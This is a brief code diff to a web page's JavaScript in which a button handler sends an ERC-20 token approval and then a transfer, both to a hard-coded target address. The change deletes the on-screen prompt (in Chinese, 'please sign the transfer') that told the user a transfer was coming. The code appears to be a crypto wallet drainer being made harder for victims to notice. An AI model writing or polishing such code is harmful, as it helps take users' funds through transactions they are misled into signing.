@@ -233,8 +233,6 @@ sendBtn.addEventListener("click", async () => {
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
         await sendTx(approveCalldata);
-
-        alert("请签名转账");
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
